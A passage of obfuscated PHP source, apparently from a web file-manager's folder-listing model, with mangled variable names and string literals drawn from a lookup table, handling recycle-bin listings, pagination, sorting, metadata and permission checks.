array_merge($Ûêâ¥÷³[$½ú›¾…ã[86]], $ÄÌ´ç†Æ); if (isset($Ûêâ¥÷³[$½ú›¾…ã[453]]) && count($›ó·îƒû) == $Ûêâ¥÷³[$½ú›¾…ã[453]][$½ú›¾…ã[454]]) { return $Ûêâ¥÷³; } $ÛŠñ®ŞŒ = array(); $Œ®ğ‹á = array_to_keyvalue($Ûêâ¥÷³[$½ú›¾…ã[85]], $½ú›¾…ã[12], $½ú›¾…ã[193]); $«úâ¤ä = array_to_keyvalue($Ûêâ¥÷³[$½ú›¾…ã[86]], $½ú›¾…ã[12], $½ú›¾…ã[193]); $šû±³ß  = array_merge($«úâ¤ä, $Œ®ğ‹á); foreach ($›ó·îƒû as $´ø§ÓñŸ) { if (!in_array($´ø§ÓñŸ, $šû±³ß )) { $ÛŠñ®ŞŒ[] = $´ø§ÓñŸ; } } if ($ÛŠñ®ŞŒ) { Model($½ú›¾…ã[513])->removeBySource($ÛŠñ®ŞŒ); } return $Ûêâ¥÷³; } public function listUserRecycle() { $İ™™•ØŸ =& $_SERVER[´È¥ö†ö]; $ˆ¸®¤úì = Model($İ™™•ØŸ[514])->listData(); if (!$ˆ¸®¤úì) { return array(); } $ï—ê÷ = array($İ™™•ØŸ[502] => array($İ™™•ØŸ[503], $ˆ¸®¤úì), $İ™™•ØŸ[515] => 1); return $this->listSource($ï—ê÷); } public function listSource($£ğô‚¢², $¡¾ˆœİ£ = 3000, $äÍª¡¦ï = false) { $¿·»ÇÖŸ =& $_SERVER[´È¥ö†ö]; if (!isset($£ğô‚¢²[$¿·»ÇÖŸ[516]])) { $£ğô‚¢²[$¿·»ÇÖŸ[516]] = 0; } if (isset($£ğô‚¢²[$¿·»ÇÖŸ[192]]) && $£ğô‚¢²[$¿·»ÇÖŸ[192]] == $¿·»ÇÖŸ[230]) { $£ğô‚¢²[$¿·»ÇÖŸ[497]] = array($¿·»ÇÖŸ[517], $¿·»ÇÖŸ[12]); } $œ‹ØßÆ = $¿·»ÇÖŸ[518]; $­ÏĞÈÙŒ = $this->field($œ‹ØßÆ)->_makeOrder()->where($£ğô‚¢²)->selectPage($¡¾ˆœİ£); $this->_listPageCheck($­ÏĞÈÙŒ, $œ‹ØßÆ, $£ğô‚¢²); $this->_listDataApply($­ÏĞÈÙŒ[$¿·»ÇÖŸ[456]], $äÍª¡¦ï); $this->_listMake($­ÏĞÈÙŒ); return $­ÏĞÈÙŒ; } private function _listPageCheck(&$ÅÌÅ–½æ, $ÈÇ÷éıØ, $Ù™ä†ş) { $ªÇéÌö =& $_SERVER[´È¥ö†ö]; if (!is_array($ÅÌÅ–½æ[$ªÇéÌö[453]])) { return; } $Ã¼ê‚µÅ = $ÅÌÅ–½æ[$ªÇéÌö[453]]; if ($Ã¼ê‚µÅ[$ªÇéÌö[455]] <= 1) { return; } if ($Ã¼ê‚µÅ[$ªÇéÌö[454]] >= 100000) { return; } if (Model($ªÇéÌö[519])->get($ªÇéÌö[520]) != $ªÇéÌö[521]) { return; } $ÈÇ÷éıØ = str_replace(array($ªÇéÌö[53], $ªÇéÌö[428], $ªÇéÌö[287]), $ªÇéÌö[12], $ÈÇ÷éıØ); $ÈÇ÷éıØ = $ªÇéÌö[522] . str_replace($ªÇéÌö[50], $ªÇéÌö[523], $ÈÇ÷éıØ) . $ªÇéÌö[524]; $ßĞŸŞ = $ªÇéÌö[525]; $ßĞŸŞ = $ßĞŸŞ . $ªÇéÌö[526]; $éÜ·ò­Ú = $Ã¼ê‚µÅ[$ªÇéÌö[450]] * ($Ã¼ê‚µÅ[$ªÇéÌö[439]] - 1) . $ªÇéÌö[50] . $Ã¼ê‚µÅ[$ªÇéÌö[450]]; $¨”ıƒïˆ = $this->_makeOrder(!0); $µÙİÄ· = $ªÇéÌö[522] . str_replace($ªÇéÌö[50], $ªÇéÌö[523], $¨”ıƒïˆ[0]); if (strpos($µÙİÄ·, $ªÇéÌö[527])) { $µÙİÄ· = str_replace($ªÇéÌö[527], $ªÇéÌö[528], $µÙİÄ·); } else { $µÙİÄ· .= $ªÇéÌö[529] . $¨”ıƒïˆ[1]; } $×æ³ÚìÁ = array(); foreach ($Ù™ä†ş as $õ­¥†› => $Â‘å®¦‹) { $×æ³ÚìÁ[$ªÇéÌö[522] . $õ­¥†›] = $Â‘å®¦‹; } $this->alias($ªÇéÌö[530])->field($ÈÇ÷éıØ)->limit($éÜ·ò­Ú)->order($µÙİÄ·); $Ì²óšé° = $this->join($ßĞŸŞ)->where($×æ³ÚìÁ)->select(); if ($Ì²óšé°) { $ÅÌÅ–½æ[$ªÇéÌö[456]] = $Ì²óšé°; } } protected function _makeOrder($ì«Õìşñ = false) { $­ÚÔ«£ô =& $_SERVER[´È¥ö†ö]; $ª÷ØŞ”ı = Model($­ÚÔ«£ô[531])->get($­ÚÔ«£ô[532]); $Ÿ•ÁŒÜ· = Model($­ÚÔ«£ô[531])->get($­ÚÔ«£ô[533]); $Ç×˜Œ™– = array($­ÚÔ«£ô[534] => $­ÚÔ«£ô[535], $­ÚÔ«£ô[536] => $­ÚÔ«£ô[537]); $ã®½¨Ì‚ = array($­ÚÔ«£ô[32] => $­ÚÔ«£ô[32], $­ÚÔ«£ô[79] => $­ÚÔ«£ô[79], $­ÚÔ«£ô[169] => $­ÚÔ«£ô[497], $­ÚÔ«£ô[538] => $­ÚÔ«£ô[538], $­ÚÔ«£ô[539] => $­ÚÔ«£ô[540], $­ÚÔ«£ô[233] => $­ÚÔ«£ô[233], $­ÚÔ«£ô[88] => $­ÚÔ«£ô[88]); $ã­şºÍ× = Input::get($­ÚÔ«£ô[541], $­ÚÔ«£ô[7], $ª÷ØŞ”ı, array_keys($ã®½¨Ì‚)); $é”¨å¤û = Input::get($­ÚÔ«£ô[542], $­ÚÔ«£ô[7], $Ÿ•ÁŒÜ·, array_keys($Ç×˜Œ™–)); if (!in_array($ã­şºÍ×, array_keys($ã®½¨Ì‚))) { $ã­şºÍ× = $­ÚÔ«£ô[32]; } if (!in_array($é”¨å¤û, array_keys($Ç×˜Œ™–))) { $ã­şºÍ× = $­ÚÔ«£ô[534]; } if ($ã­şºÍ× == $­ÚÔ«£ô[32]) { } $¸Û¥³úÔ = $­ÚÔ«£ô[543] . $ã®½¨Ì‚[$ã­şºÍ×] . $­ÚÔ«£ô[53] . $Ç×˜Œ™–[$é”¨å¤û]; $¸Û¥³úÔ = rtrim(trim($¸Û¥³úÔ), $­ÚÔ«£ô[50]); if ($ì«Õìşñ) { return array($¸Û¥³úÔ, $Ç×˜Œ™–[$é”¨å¤û]); } return $this->order($¸Û¥³úÔ); } protected function _listDataApplyItem($Ù«¸®õ, $Ç†ëÃ¦© = false) { $¥¢äŒ‹ç = array($Ù«¸®õ); $this->_listDataApply($¥¢äŒ‹ç, $Ç†ëÃ¦©); return $¥¢äŒ‹ç[0]; } protected function _listDataApply(&$´‚ŒÜ€¡, $« ¦–´³ = false) { $Ç§ø§—Ò =& $_SERVER[´È¥ö†ö]; if (!$´‚ŒÜ€¡) { $´‚ŒÜ€¡ = array(); return; } $ğåÔñ‡¢ = array_to_keyvalue($´‚ŒÜ€¡, $Ç§ø§—Ò[12], $Ç§ø§—Ò[193]); $ğåÔñ‡¢ = array_unique($ğåÔñ‡¢); $this->_listSourceCache($´‚ŒÜ€¡); if (!$« ¦–´³) { $this->_listAppendMeta($´‚ŒÜ€¡, $ğåÔñ‡¢); $this->_listAppendFileMeta($´‚ŒÜ€¡, $ğåÔñ‡¢); $this->_listAppendChildren($´‚ŒÜ€¡, $ğåÔñ‡¢); } $this->_listAppendPath($´‚ŒÜ€¡); $this->_listAppendAuth($´‚ŒÜ€¡); $this->_listAppendSourceInfo($´‚ŒÜ€¡, $ğåÔñ‡¢); $this->_listAppendUser($´‚ŒÜ€¡); $this->_listFilterInfo($´‚ŒÜ€¡, $« ¦–´³); $this->_listAppendAuthSecret($´‚ŒÜ€¡); } protected function _listSourceCache($ş—í ö) { $ úß€… =& $_SERVER[´È¥ö†ö]; foreach ($ş—í ö as $ıÂ­êèª) { self::$cacheSourceInfo[$ úß€…[544] . $ıÂ­êèª[$ úß€…[193]]] = $ıÂ­êèª; } } protected function _listFilterInfo(&$˜¿©¶Ú, $Î›¤ÖÜí = false) { $‰°“Ïş =& $_SERVER[´È¥ö†ö]; foreach ($˜¿©¶Ú as &$Î…ŠíÇİ) { $Î…ŠíÇİ = $this->pathInfoFilter($Î…ŠíÇİ); self::$cachePathInfo[$‰°“Ïş[545] . intval($Î›¤ÖÜí) . $‰°“Ïş[473] . $Î…ŠíÇİ[$‰°“Ïş[193]]] = $Î…ŠíÇİ; } unset($Î…ŠíÇİ); } protected function _listMake(&$åŒç‚£ø) { $§†“½æ§ =& $_SERVER[´È¥ö†ö]; $åŒç‚£ø[$§†“½æ§[85]] = array(); $åŒç‚£ø[$§†“½æ§[86]] = array(); foreach ($åŒç‚£ø[$§†“½æ§[456]] as $©·Ø©ìœ) { $éùŒÕÒ® = $©·Ø©ìœ[$§†“½æ§[496]] == 1 ? $§†“½æ§[85] : $§†“½æ§[86]; $åŒç‚£ø[$éùŒÕÒ®][] = $©·Ø©ìœ; } unset($åŒç‚£ø[$§†“½æ§[456]]); } protected function _listAppendMeta(&$úœºé², $¤ ½¼ÙÅ) { $Œ¼Õ†¯Â =& $_SERVER[´È¥ö†ö]; $Ê¹·÷ÆÆ = array($Œ¼Õ†¯Â[502] => array($Œ¼Õ†¯Â[503], $¤ ½¼ÙÅ)); $î¿î—ä = Model($Œ¼Õ†¯Â[546])->field($Œ¼Õ†¯Â[547])->where($Ê¹·÷ÆÆ)->select(); if (!$î¿î—ä) { return; } $™Ü’úÛ‚ = array($Œ¼Õ†¯Â[548], $Œ¼Õ†¯Â[549], $Œ¼Õ†¯Â[528]); $¿¡èÇ¿Ê = array(); foreach ($î¿î—ä as $±£™Ñ¼€) { if (!isset($¿¡èÇ¿Ê[$±£™Ñ¼€[$Œ¼Õ†¯Â[193]]])) { $¿¡èÇ¿Ê[$±£™Ñ¼€[$Œ¼Õ†¯Â[193]]] = array(); } if (in_array($±£™Ñ¼€[$Œ¼Õ†¯Â[97]], $™Ü’úÛ‚)) { continue; } $¿¡èÇ¿Ê[$±£™Ñ¼€[$Œ¼Õ†¯Â[193]]][$±£™Ñ¼€[$Œ¼Õ†¯Â[97]]] = $±£™Ñ¼€[$Œ¼Õ†¯Â[461]]; } foreach ($úœºé² as &$¥éŸİå) { $¥éŸİå[$Œ¼Õ†¯Â[550]] = !1; if (isset($¿¡èÇ¿Ê[$¥éŸİå[$Œ¼Õ†¯Â[193]]])) { $¥éŸİå[$Œ¼Õ†¯Â[550]] = $¿¡èÇ¿Ê[$¥éŸİå[$Œ¼Õ†¯Â[193]]]; } if ($this->fileIsLock($¥éŸİå) && $¥éŸİå[$Œ¼Õ†¯Â[498]]) { $¾Õ°çùĞ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $¥éŸİå[$Œ¼Õ†¯Â[498]][$Œ¼Õ†¯Â[499]] = AuthModel::authDisable($¥éŸİå[$Œ¼Õ†¯Â[498]][$Œ¼Õ†¯Â[499]], $¾Õ°çùĞ); $¥éŸİå[$Œ¼Õ†¯Â[498]][$Œ¼Õ†¯Â[551]][$Œ¼Õ†¯Â[498]] = $¥éŸİå[$Œ¼Õ†¯Â[498]][$Œ¼Õ†¯Â[499]]; } } unset($¥éŸİå); } protected function _listAppendFileMeta(&$šÕ›ÚŠ÷, $Á•Ô‡ƒô) { $ıÂÒ×‚¯ =& $_SERVER[´È¥ö†ö]; $ÕËçŒ’ô = array_to_keyvalue($šÕ›ÚŠ÷, $ıÂÒ×‚¯[12], $ıÂÒ×‚¯[552]); $ÕËçŒ’ô = array_filter(array_unique($ÕËçŒ’ô)); if (!$ÕËçŒ’ô) { return; } $÷Ğ”­ï­ = array($ıÂÒ×‚¯[553] => array($ıÂÒ×‚¯[503], $ÕËçŒ’ô)); $öşÇÓÑ = $ıÂÒ×‚¯[554]; $ö¢µ‡œ = Model($ıÂÒ×‚¯[555])->field($öşÇÓÑ)->where($÷Ğ”­ï­)->select(); $ö¢µ‡œ = array_to_keyvalue($ö¢µ‡œ, $ıÂÒ×‚¯[552]); $öÕ¥‡ÚÔ = Model($ıÂÒ×‚¯[556])->field($ıÂÒ×‚¯[557])->where($÷Ğ”­ï­)->select(); $öÕ¥‡ÚÔ = $öÕ¥‡ÚÔ ? $öÕ¥‡ÚÔ : array(); $ºï¦¾ÌŠ = array(); foreach ($öÕ¥‡ÚÔ as $‘ş¦º¨ò) { if (!isset($ºï¦¾ÌŠ[$‘ş¦º¨ò[$ıÂÒ×‚¯[552]]])) { $ºï¦¾ÌŠ[$‘ş¦º¨ò[$ıÂÒ×‚¯[552]]] = array(); } $ºï¦¾ÌŠ[$‘ş¦º¨ò[$ıÂÒ×‚¯[552]]][$‘ş¦º¨ò[$ıÂÒ×‚¯[97]]] = $‘ş¦º¨ò[$ıÂÒ×‚¯[461]]; } foreach ($šÕ›ÚŠ÷ as &$áÅìºöØ) { $¼àÇ£©Ş = $áÅìºöØ[$ıÂÒ×‚¯[552]]; if (!$¼àÇ£©Ş || !is_array($ö¢µ‡œ[$¼àÇ£©Ş])) { continue; } $°›ú¶´‚ = $ö¢µ‡œ[$¼àÇ£©Ş]; $°›ú¶´‚[$ıÂÒ×‚¯[79]] = $áÅìºöØ[$ıÂÒ×‚¯[79]]; $°›ú¶´‚[$ıÂÒ×‚¯[32]] = $áÅìºöØ[$ıÂÒ×‚¯[32]]; if (!$°›ú¶´‚[$ıÂÒ×‚¯[558]]) { Model($ıÂÒ×‚¯[555])->fileMd5Check($°›ú¶´‚); } if (!isset(self::$cacheFileInfo[$ıÂÒ×‚¯[559] . $¼àÇ£©Ş])) { self::$cacheFileInfo[$ıÂÒ×‚¯[559] . $¼àÇ£©Ş] = array_merge(array(), $°›ú¶´‚); } unset($ö¢µ‡œ[$¼àÇ£©Ş][$ıÂÒ×‚¯[87]]); $ŠºíğËŸ = isset($ºï¦¾ÌŠ[$¼àÇ£©Ş]) && is_array($ºï¦¾ÌŠ[$¼àÇ£©Ş]) ? $ºï¦¾ÌŠ[$¼àÇ£©Ş] : array(); $áÅìºöØ[$ıÂÒ×‚¯[170]] = array_merge($ŠºíğËŸ, $ö¢µ‡œ[$¼àÇ£©Ş]); if (isset($áÅìºöØ[$ıÂÒ×‚¯[170]][$ıÂÒ×‚¯[184]])) { $áÅìºöØ[$ıÂÒ×‚¯[184]] = json_decode($áÅìºöØ[$ıÂÒ×‚¯[170]][$ıÂÒ×‚¯[184]], !0); unset($áÅìºöØ[$ıÂÒ×‚¯[170]][$ıÂÒ×‚¯[184]]); } } unset($áÅìºöØ); } protected function _listAppendSourceInfo(&$ñÒ­ò™Õ, $â¦âèÌ²) { $ñ¾é çÃ =& $_SERVER[´È¥ö†ö]; $ƒÆµñ¢ù = Model($ñ¾é çÃ[560])->listData(); $Ñğ–ñ½ = Model($ñ¾é çÃ[510])->listData(); $É–Á¸‚ = Model($ñ¾é çÃ[500])->listData(); $š–Ãù“Í = Model($ñ¾é çÃ[561])->listSimple(); $üìİ = array_to_keyvalue($ƒÆµñ¢ù, $ñ¾é çÃ[486]); $‰¨äÉùÜ = array_to_keyvalue_group($Ñğ–ñ½, $ñ¾é çÃ[87], $ñ¾é çÃ[511]); $¤À»÷ = array_to_keyvalue($É–Á¸‚, $ñ¾é çÃ[87]); $¶¢ØÀúØ = array_to_keyvalue_group($š–Ãù“Í, $ñ¾é çÃ[193]); foreach ($ñÒ­ò™Õ as &$§¨Ï¡©) { $§¨Ï¡©[$ñ¾é çÃ[90]] = array($ñ¾é çÃ[562] => 0, $ñ¾é çÃ[563] => 0, $ñ¾é çÃ[564] => 0); if (isset($¤À»÷[$§¨Ï¡©[$ñ¾é çÃ[193]]])) { $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[565]] = 1; $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[566]] = $¤À»÷[$§¨Ï¡©[$ñ¾é çÃ[193]]][$ñ¾é çÃ[32]]; } if ($‰¨äÉùÜ && $üìİ && isset($‰¨äÉùÜ[$§¨Ï¡©[$ñ¾é çÃ[193]]])) { $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[567]] = array(); foreach ($‰¨äÉùÜ[$§¨Ï¡©[$ñ¾é çÃ[193]]] as $¸ÓåÉ) { $É³İú¬ = $üìİ[$¸ÓåÉ]; $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[567]][] = array($ñ¾é çÃ[568] => $É³İú¬[$ñ¾é çÃ[486]], $ñ¾é çÃ[505] => $É³İú¬[$ñ¾é çÃ[32]], $ñ¾é çÃ[569] => $É³İú¬[$ñ¾é çÃ[570]]); } } if ($¶¢ØÀúØ && isset($¶¢ØÀúØ[$§¨Ï¡©[$ñ¾é çÃ[193]]])) { $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[571]] = array(); foreach ($¶¢ØÀúØ[$§¨Ï¡©[$ñ¾é çÃ[193]]] as $À³„¼¤‡) { $ıÜØ‰Úµ = $ñ¾é çÃ[572]; if ($À³„¼¤‡[$ñ¾é çÃ[573]] == $ñ¾é çÃ[91]) { $ıÜØ‰Úµ .= $ñ¾é çÃ[574]; } $§¨Ï¡©[$ñ¾é çÃ[90]][$ñ¾é çÃ[571]] = array_field_key($À³„¼¤‡, explode($ñ¾é çÃ[50], $ıÜØ‰Úµ)); } } } unset($§¨Ï¡©); return $ñÒ­ò™Õ; } protected function _listAppendChildren(&$£ğÏ¿ÃŸ, $Š¾¾¸ÂÈ) { $¬»Ø·Œ• =& $_SERVER[´È¥ö†ö]; $®Æ¦ûû– = array(); $Àê¾¨úè = array($¬»Ø·Œ•[241] => 0, $¬»Ø·Œ•[242] => 0); foreach ($£ğÏ¿ÃŸ as &$ûî¾ñ‘) { if (!$ûî¾ñ‘[$¬»Ø·Œ•[496]]) { continue; } $®Æ¦ûû–[] = $ûî¾ñ‘[$¬»Ø·Œ•[193]]; } unset($ûî¾ñ‘); if (!$®Æ¦ûû–) { return; } $´¸×…Ö = array($¬»Ø·Œ•[192] => array($¬»Ø·Œ•[7], $®Æ¦ûû–), $¬»Ø·Œ•[516] => 0); $ƒ„ãÁòİ = array($¬»Ø·Œ•[192], $¬»Ø·Œ•[496], $¬»Ø·Œ•[575] => $¬»Ø·Œ•[576]); $ŠıÕÖ³¬ = $this->field($ƒ„ãÁòİ)->where($´¸×…Ö)->group($¬»Ø·Œ•[577])->select(); $Ê™«Ï²® = array(); foreach ($ŠıÕÖ³¬ as $š×¿ú³‘) { $Ã­†äˆ¬ = $š×¿ú³‘[$¬»Ø·Œ•[192]]; $ª¾µªü = $š×¿ú³‘[$¬»Ø·Œ•[496]] == $¬»Ø·Œ•[91] ? $¬»Ø·Œ•[242] : $¬»Ø·Œ•[241]; if (!isset($Ê™«Ï²®[$Ã­†äˆ¬])) { $Ê™«Ï²®[$Ã­†äˆ¬] = array($¬»Ø·Œ•[241] => 0, $¬»Ø·Œ•[242] => 0); } $Ê™«Ï²®[$Ã­†äˆ¬][$ª¾µªü] += $š×¿ú³‘[$¬»Ø·Œ•[576]]; } foreach ($£ğÏ¿ÃŸ as &$ûî¾ñ‘) { if (!$ûî¾ñ‘[$¬»Ø·Œ•[496]]) { continue; } $à¢Û¼¶ = is_array($Ê™«Ï²®[$ûî¾ñ‘[$¬»Ø·Œ•[193]]]) ? $Ê™«Ï²®[$ûî¾ñ‘[$¬»Ø·Œ•[193]]] : $Àê¾¨úè; $ûî¾ñ‘[$¬»Ø·Œ•[242]] = $à¢Û¼¶[$¬»Ø·Œ•[242]]; $ûî¾ñ‘[$¬»Ø·Œ•[241]] = $à¢Û¼¶[$¬»Ø·Œ•[241]]; unset($ûî¾ñ‘[$¬»Ø·Œ•[497]]); } unset($ûî¾ñ‘); } protected function _listAppendAuth(&$äÏÌÚ†ä) { $á’ˆÂ”Õ =& $_SERVER[´È¥ö†ö]; $áì€á = array(); foreach ($äÏÌÚ†ä as $Ì›É®Œ©) { if ($Ì›É®Œ©[$á’ˆÂ”Õ[190]] == self::TYPE_GROUP) { $áì€á[] = $Ì›É®Œ©[$á’ˆÂ”Õ[193]]; } } if (!$áì€á) { return; } $Å“áà•¡ = array_to_keyvalue($äÏÌÚ†ä, $á’ˆÂ”Õ[193]); $†ÎŠñÊ¢ = Model($á’ˆÂ”Õ[578])->getSourceList($áì€á, $Å“áà•¡); $ï…‚Æ±• = KodUser::isRoot(); foreach ($äÏÌÚ†ä as $‡ı½ã½± => &$Ì›É®Œ©) { $Ì›É®Œ©[$á’ˆÂ”Õ[498]] = $†ÎŠñÊ¢[$Ì›É®Œ©[$á’ˆÂ”Õ[193]]]; if (!$Ì›É®Œ©[$á’ˆÂ”Õ[498]] && $Ì›É®Œ©[$á’ˆÂ”Õ[190]] == self::TYPE_GROUP) { $Ì›É®Œ©[$á’ˆÂ”Õ[498]] = Action($á’ˆÂ”Õ[579])->pathGroupAuthMake($Ì›É®Œ©[$á’ˆÂ”Õ[580]]); if (!$Ì›É®Œ©[$á’ˆÂ”Õ[498]] && !$ï…‚Æ±•) { $Ì›É®Œ©[$á’ˆÂ”Õ[235]] = !1; $Ì›É®Œ©[$á’ˆÂ”Õ[234]] = !1; } } if ($Ì›É®Œ©[$á’ˆÂ”Õ[498]]) { $Ì›É®Œ©[$á’ˆÂ”Õ[235]] = AuthModel::authCheckEdit($Ì›É®Œ©[$á’ˆÂ”Õ[498]][$á’ˆÂ”Õ[499]]); $Ì›É®Œ©[$á’ˆÂ”Õ[234]] = AuthModel::authCheckView($Ì›É®Œ©[$á’ˆÂ”Õ[498]][$á’ˆÂ”Õ[499]]); } $this->groupPathDisplay($Ì›É®Œ©); } unset($Ì›É®Œ©); } public function _listAppendAuthSecret(&$›©¯‡˜¹) { $şò³‡òÚ =& $_SERVER[´È¥ö†ö]; if (Model($şò³‡òÚ[519])->get($şò³‡òÚ[581]) != $şò³‡òÚ[91]) { return; } static $›Šï‹ºÒ = false; if (!$›Šï‹ºÒ) { $§èÌÑí = Model($şò³‡òÚ[582]); $ìıØ¡— = Model($şò³‡òÚ[583]); $›Šï‹ºÒ = $ìıØ¡—->listData(); $›Šï‹ºÒ = array_to_keyvalue($›Šï‹ºÒ, $şò³‡òÚ[193]); $ÚÀìĞ™¦ = json_decode(Model($şò³‡òÚ[519])->get($şò³‡òÚ[584]), !0); $ÚÀìĞ™¦ = array_to_keyvalue($ÚÀìĞ™¦, $şò³‡òÚ[486]); foreach ($›Šï‹ºÒ as $Ã×ş»¤† => $É×Æêò—) { $‘ë­²Ù’ = $ÚÀìĞ™¦[$É×Æêò—[$şò³‡òÚ[585]]]; if (!$‘ë­²Ù’) { $ìıØ¡—->remove($É×Æêò—[$şò³‡òÚ[486]]); unset($›Šï‹ºÒ[$Ã×ş»¤†]); continue; } $šÏÙ‘ã¼ = $§èÌÑí->listData($‘ë­²Ù’[$şò³‡òÚ[498]]); if (!$šÏÙ‘ã¼) { $ìıØ¡—->remove($É×Æêò—[$şò³‡òÚ[486]]); unset($›Šï‹ºÒ[$Ã×ş»¤†]); continue; } $É×Æêò—[$şò³‡òÚ[498]] = $šÏÙ‘ã¼; $É×Æêò—[$şò³‡òÚ[586]] = $‘ë­²Ù’; $É×Æêò—[$şò³‡òÚ[587]] = Model($şò³‡òÚ[588])->getInfoSimpleOuter($É×Æêò—[$şò³‡òÚ[538]]); $›Šï‹ºÒ[$Ã×ş»¤†] = $É×Æêò—; } } $Ù‰­µŞÓ = USER_ID; $ÖİÉæ¾é = array(); $»‹…±¶ = $this->_listAppendPath($ÖİÉæ¾é, !0); foreach ($›©¯‡˜¹ as $Ã×ş»¤† => &$É×Æêò—) { if (!is_array($É×Æêò—[$şò³‡òÚ[498]])) { continue; } if ($É×Æêò—[$şò³‡òÚ[190]] != $şò³‡òÚ[589]) { continue; } if (isset($›Šï‹ºÒ[$É×Æêò—[$şò³‡òÚ[193]]])) { $øÆÆŞÌÈ = $›Šï‹ºÒ[$É×Æêò—[$şò³‡òÚ[193]]]; if (!is_array($É×Æêò—[$şò³‡òÚ[550]])) { $É×Æêò—[$şò³‡òÚ[550]] = array(); } $É×Æêò—[$şò³‡òÚ[550]][$şò³‡òÚ[590]] = $øÆÆŞÌÈ[$şò³‡òÚ[585]]; $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[591]] = $øÆÆŞÌÈ; $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[592]] = $É×Æêò—[$şò³‡òÚ[593]]; $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[594]] = $şò³‡òÚ[91]; if ($øÆÆŞÌÈ[$şò³‡òÚ[538]] != $Ù‰­µŞÓ) { $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[499]] = $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[499]] & $øÆÆŞÌÈ[$şò³‡òÚ[498]][$şò³‡òÚ[498]]; } continue; } $şÁòĞÉ = $this->parentLevelArray($É×Æêò—[$şò³‡òÚ[595]]); $¦…ğËÑÜ = array_reverse($şÁòĞÉ); foreach ($¦…ğËÑÜ as $ÆÉë¸” => $“Ü½¦üÊ) { if (!isset($›Šï‹ºÒ[$“Ü½¦üÊ])) { continue; } $øÆÆŞÌÈ = $›Šï‹ºÒ[$“Ü½¦üÊ]; $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[591]] = $øÆÆŞÌÈ; if ($øÆÆŞÌÈ[$şò³‡òÚ[538]] != $Ù‰­µŞÓ) { $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[499]] = $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[499]] & $øÆÆŞÌÈ[$şò³‡òÚ[498]][$şò³‡òÚ[498]]; } $Öò®şĞ = $şò³‡òÚ[12]; $’îş© = count($şÁòĞÉ) - $ÆÉë¸”; for ($ä¥­æ¾ = 0; $ä¥­æ¾ < $’îş©; $ä¥­æ¾++) { if (!isset($»‹…±¶[$şÁòĞÉ[$ä¥­æ¾]])) { $Öò®şĞ = $şò³‡òÚ[12]; break; } $Öò®şĞ = $Öò®şĞ . rtrim($»‹…±¶[$şÁòĞÉ[$ä¥­æ¾]], $şò³‡òÚ[8]) . $şò³‡òÚ[8]; } $É×Æêò—[$şò³‡òÚ[498]][$şò³‡òÚ[592]] = rtrim($Öò®şĞ, $şò³‡òÚ[8]) . $şò³‡òÚ[8]; break; } } unset($É×Æêò—); } public function groupPathDisplay(&$ãş·Ò‡¸) { $ãé—À•Å =& $_SERVER[´È¥ö†ö]; if ($ãş·Ò‡¸[$ãé—À•Å[190]] != self::TYPE_GROUP) { return; } $ÂŞşøÀµ = Model($ãé—À•Å[596])->getInfo($ãş·Ò‡¸[$ãé—À•Å[580]]); $ÊÂíßÌó = $this->parentLevelArray($ÂŞşøÀµ[$ãé—À•Å[595]]); $ßÔÎ£ë = $ãé—À•Å[12]; foreach ($ÊÂíßÌó as $™âÙ«Àè) { $¥ê½¥® = Model($ãé—À•Å[596])->getInfo($™âÙ«Àè); $ßÔÎ£ë .= $¥ê½¥®[$ãé—À•Å[90]][$ãé—À•Å[193]] . $ãé—À•Å[50]; } $ãş·Ò‡¸[$ãé—À•Å[597]] = $ÂŞşøÀµ[$ãé—À•Å[192]]; $ãş·Ò‡¸[$ãé—À•Å[598]] = $ÂŞşøÀµ[$ãé—À•Å[595]]; $ãş·Ò‡¸[$ãé—À•Å[599]] = $ÂŞşøÀµ[$ãé—À•Å[600]]; $ãş·Ò‡¸[$ãé—À•Å[601]] = $ßÔÎ£ë . $ÂŞşøÀµ[$ãé—À•Å[90]][$ãé—À•Å[193]]; } protected function _listAppendPath(&$’şùü­, $ßÉışŸ€ = false) { $òÌß³şù =& $_SERVER[´È¥ö†ö]; static $Òôèñ»ã = array(); $èïÜ’” = array(); $áïò³÷Ô = array(); if ($ßÉışŸ€) { return $Òôèñ»ã; } foreach ($’şùü­ as &$«›Î®ş¢) { $û‹’¬¹„ = $«›Î®ş¢[$òÌß³şù[193]]; if ($«›Î®ş¢[$òÌß³şù[496]] == $òÌß³şù[91] && $«›Î®ş¢[$òÌß³şù[192]] != 0) { $Òôèñ»ã[$û‹’¬¹„] = $«›Î®ş¢[$òÌß³şù[32]]; } if ($«›Î®ş¢[$òÌß³şù[496]] == $òÌß³şù[91] && $«›Î®ş¢[$òÌß³şù[192]] == 0) { $Òôèñ»ã[$û‹’¬¹„] = $this->_listAppendPathRoot($«›Î®ş¢, array()); } if (isset($áïò³÷Ô[$«›Î®ş¢[$òÌß³şù[595]]])) { continue; } $áïò³÷Ô[$«›Î®ş¢[$òÌß³şù[595]]] = !0; $¦¤¾’£Ó = $this->parentLevelArray($«›Î®ş¢[$òÌß³şù[595]]); foreach ($¦¤¾’£Ó as $¾ûÒØİ« => $·òàšŒ¹) { if (isset($Òôèñ»ã[$·òàšŒ¹])) { continue; } if ($¾ûÒØİ« == 0) { $Òôèñ»ã[$·òàšŒ¹] = $this->_listAppendPathRoot($«›Î®ş¢, $¦¤¾’£Ó); } if ($¾ûÒØİ« != 0) { $èïÜ’”[] = $·òàšŒ¹; } } } unset($«›Î®ş¢); $èïÜ’” = array_unique($èïÜ’”); if (count($èïÜ’”) > 0) { $»¤çª… = array($òÌß³şù[502] => array($òÌß³şù[503], $èïÜ’”)); if (count($èïÜ’”) == 1) { $¯Ä€“ÖØ = $this->sourceInfo($èïÜ’”[0]); $èòÛÁ´ = is_array($¯Ä€“ÖØ) ? array($¯Ä€“ÖØ) : !1; } else { $èòÛÁ´ = 